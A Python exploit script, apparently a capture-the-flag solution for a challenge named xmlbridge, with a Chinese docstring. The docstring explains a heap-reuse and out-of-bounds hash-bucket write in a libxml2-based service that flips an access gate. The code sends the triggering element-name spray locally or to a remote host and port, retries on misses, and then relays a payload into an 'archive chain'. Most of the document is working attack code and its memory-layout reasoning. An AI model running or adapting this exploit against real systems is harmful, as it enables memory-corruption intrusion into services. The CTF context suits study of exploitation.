#!/usr/bin/env python3
"""12073 xmlbridge —— 门禁绕过（`*(u32*)(g_doc+4) = 1`）+ 归档链入口

用法:
    python3 12073-solve.py                     # 本地自测（附件自带 loader）
    python3 12073-solve.py HOST PORT           # 打远端
    python3 12073-solve.py HOST PORT --d HEX   # 门禁开了以后用 D 发给 broker 的正文（hex）

原理（全部在本地实证，见 work/12073s/FINDINGS.md §14）
------------------------------------------------------
1. `E` 把 0x500 快照缓冲 free 掉（TEXT 节点的 xmlNodeSetContent 先 free(content)）；
   0x510 超过 tcache 上限 0x410 ⇒ 进 unsorted bin。
2. `A` 里 `xmlDictCreate()` 的 dict 结构体(0x40)正好复用那个地址；dict 的 0x1000
   哈希表从 top chunk 拿；`A` 的第二个 malloc(0x420)=g_doc 紧贴在表后面 ⇒
   `bucket[128]` 正好落在 `g_doc` 的 chunk 头，`bucket[128]+0x14 == g_doc+4`。
3. `A` 里 xmlSetStructuredErrorFunc 装的回调条件为 `err->code == 0x216`
   (= XML_DTD_UNKNOWN_ELEM，DTD 校验的**非致命** validity 错误)，回调执行
   `*(u64*)(旧快照地址 + 0x10) += 1` ⇒ 命中 `dict->size`，0x80 → 0x81。
4. size=0x81 时 xmlDictLookup 走慢路径 `index = hash % size`，可取到 128（越界一格）；
   插入代码硬编码 `entry->okey = 1`，而 entry+0x14 正是 `g_doc+4` ⇒ 门禁 = 1。
5. 触发方式：`A` 送 `<!DOCTYPE q [<!ELEMENT q EMPTY>]><r>` + 129 个随机元素名，
   第一个未声明元素触发 534，其余名字里有一个会 hash%129==128。

命中概率：每个名字 1/129；129 个时 P(恰好一次)≈37%（实测 58%，未命中不崩、可重试；
≥2 次命中会崩掉**本条连接**，进程是每连接 fork/exec 的，重连即可）。
"""
import os
import random
import socket
import string
import struct
import subprocess
import sys
import select

WD = "~/ctf-2026/work/12073_xmlbridge"
SPRAY = 129
L_DOC = '<sheet><item>x</item></sheet>'
I_DOC = '<root><target>y</target></root>'
A_PREFIX = '<!DOCTYPE q [<!ELEMENT q EMPTY>]><r>'
B_SUFFIX = '</r>'


def frame(op, body=b""):
    if isinstance(body, str):
        body = body.encode()
    return op.encode() + struct.pack(">I", len(body)) + body


def names(n, taglen=8, rng=random):
    return "".join("<%s/>" % "".join(rng.choice(string.ascii_lowercase)
                                     for _ in range(taglen)) for _ in range(n))


class LocalIO:
    def __init__(self):
        self.p = subprocess.Popen(
            ["./ld-linux-x86-64.so.2", "--library-path", ".", "./xmlbridge"],
            cwd=WD, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL)
    def send(self, d):
        try:
            self.p.stdin.write(d); self.p.stdin.flush(); return True
        except (BrokenPipeError, ValueError):
            return False
    def recv(self, t=3.0):
        r, _, _ = select.select([self.p.stdout], [], [], t)
        return os.read(self.p.stdout.fileno(), 0x2000) if r else None
    def close(self):
        try: self.p.stdin.close()
        except Exception: pass
        try: self.p.wait(timeout=3)
        except Exception: self.p.kill()


class SockIO:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, int(port)), timeout=10)
        self.s.setblocking(False)
    def send(self, d):
        try:
            self.s.sendall(d); return True
        except OSError:
            return False
    def recv(self, t=6.0):
        r, _, _ = select.select([self.s], [], [], t)
        if not r:
            return None
        try:
            return self.s.recv(0x4000)
        except OSError:
            return None
    def close(self):
        try: self.s.close()
        except Exception: pass


def open_gate(io, rng=random, log=print):
    """Play the 8-step precondition + the dict-OOB trigger.  True == gate open."""
    steps = [("L", L_DOC), ("I", I_DOC), ("R", "hello"), ("C", ""), ("S", ""),
             ("E", "edit"), ("A", A_PREFIX + names(SPRAY, rng=rng)), ("B", B_SUFFIX)]
    for op, body in steps:
        if not io.send(frame(op, body)):
            return False, None
        r = io.recv()
        if r is None:
            return False, None
        if op == "B":
            # DOC frame => gate open ; b"ERR\n" => this spray missed
            return (not r.startswith(b"ERR\n")), r
        if r != b"OK\n":
            return False, None
    return False, None


def relay(io, payload):
    """D: hand `payload` to the archive chain (broker). Returns the raw reply."""
    if not io.send(frame("D", payload)):
        return None
    return io.recv()


def run(host=None, port=None, tries=12, d_payload=b"XBRDGv3", rng=random):
    for i in range(1, tries + 1):
        io = SockIO(host, port) if host else LocalIO()
        try:
            ok, breply = open_gate(io, rng=rng)
            if ok:
                print("[+] gate open on attempt %d (B -> %r)" % (i, breply))
                out = relay(io, d_payload)
                print("[+] D reply: %r" % (out,))
                return True, out
            print("[-] attempt %d missed (B -> %r)" % (i, breply))
        finally:
            io.close()
    return False, None


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    dhex = None
    if "--d" in sys.argv:
        dhex = sys.argv[sys.argv.index("--d") + 1]
    payload = bytes.fromhex(dhex) if dhex else b"XBRDGv3"
    if len(args) >= 2:
        ok, out = run(args[0], args[1], d_payload=payload)
    else:
        ok, out = run(d_payload=payload)
    print("RESULT:", "gate opened, archive chain reachable" if ok else "FAILED")
